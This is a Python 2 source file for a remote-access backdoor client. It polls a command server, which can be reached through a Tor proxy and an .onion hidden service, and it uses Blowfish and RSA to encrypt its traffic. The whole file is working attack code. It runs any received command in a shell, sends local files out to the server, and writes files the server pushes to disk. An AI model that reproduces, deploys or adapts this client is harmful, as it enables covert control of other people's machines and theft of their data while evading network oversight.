#! /usr/bin/env python
# 
# Copyright (c) 2010 Xavier Garcia
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import urllib,re, binascii, getopt, sys,time, rsa,string, random,  os.path, tempfile, os
from blowfish import *
from subprocess import *


def execute_cmd(cmd):
	stdOut=""
	stdErr=""

	process=Popen(["/bin/sh", "-c" , cmd],stdout=PIPE,stderr=PIPE,stdin=None)
	stdOut, stdErr=process.communicate()
	return "cmd:%s\n%s" % (stdErr,stdOut)

def get_file_contents(file):
	if  os.path.isfile(file):
		fd=open(file,'rb')
		data=fd.read()
		fd.close()
		return binascii.hexlify(data)
	else: return ""

def write_file_contents(file_contents):
        if file_contents != "":
                fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
                os.close(fd)
                fd=open(tmpPayload,'w')
                fd.write(binascii.unhexlify(file_contents))
                fd.close()
		return binascii.hexlify(tmpPayload)
	else: return ""



def execution_response(cmd):
	values = { 'cmd' : binascii.hexlify(encrypt(cmd,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
	data = urllib.urlencode(values)
	conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
	result=conn.read()



def request_handler(cmd):
	if cmd[0:5]=="quit:":
		return False
	elif cmd[0:9]=="download:":
		execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
		return True
	elif cmd[0:7]=="upload:":
		execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
		return True
        else:
		execution_response(execute_cmd(cmd))
		return True



def contact_server():
	try:
		command_output=""
		values = { 'cmd' : binascii.hexlify(encrypt('HELLO',passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
		data = urllib.urlencode(values)
		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
		result=conn.read()
		match= re.match(command_regexp, result)
		if match!=None:
			return request_handler(decrypt(binascii.unhexlify(match.groups()[0]),passwd))
		else:
			return True
	except:
		return True

def usage():
	print """client.py <-c seconds> 
	It will request a command and execute it, for every time the script is executed.
        In case of using -c, it will continuously request commands to the server.

	-c seconds. Time that the client will wait until the next connection attempt
        """

def password(length):

	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
	min = 1
	max = 1
	total = length
	string=''
	for count in xrange(1,total):
	  for x in random.sample(alphabet,random.randint(min,max)):
	      string+=x
        return string

command_regexp="^cmd=(\w{1,})$"
subcommand_download_regexp=""
subcommand_upload_regexp=""
passwd=password(20)

try:
        server=os.environ['PYSERVER_IP']
except KeyError:
	server="127.0.0.1"
	#server="tor-proxy.net"

try:
        port=os.environ['PYSERVER_PORT']
except KeyError:
	port="8080"
	#port="80"

try:
        hidden_service=os.environ['HIDDEN_SERVICE']
except KeyError:
	hidden_service="o3mco5aw544ls6du.onion"

#We will connect through Tor
try:
        os.environ['TOR_MODE']
	request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
	response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
	port="80"
	server="tor-proxy.net"

except KeyError:
	request_command_resource="/get.html" 
	response_command_resource="/put.html"



public={'e': 12765662626842123815481067847587949200661766245321760889709889046822638084481165784057284123054868562028885770753937873135895248452711698867322363573755509L, 'n': 6670204349974766786486025308702639754997599591560961604655174715263317636836612382523664666170516679176618161283459910889756304321912885967269425897143605737602153478507650483060215486084472859254809428113014384520628716870802560675634211006890817931766331058637157223278955216319037058031119518376261623441717669911594897972723612545099524624178297453680426328165227828416826977994411779382362869355088428553123931482139878281954231142991811152056548065569650847915153537291470173503926317706272431561647632937469021806777354282558079091000609427815612534260857745167512041714839987398717022508605411199651359095421L}


	


def main():
	forever=False
	clock=1

	try:
		opts, args = getopt.getopt(sys.argv[1:], "c:")
	except getopt.GetoptError, err:
		print str(err)
		usage()
		sys.exit(2)
	
	for o, a in opts:
		if o == "-c":
			forever=True
			try:
				clock=int(a)
				if clock < 1:
					usage()
					sys.exit(2)
			except:
				usage()
				sys.exit(2)
	
	if not forever: 
		contact_server()
	
	else:
		while contact_server():
			time.sleep(clock)

if __name__ == '__main__':
	main()


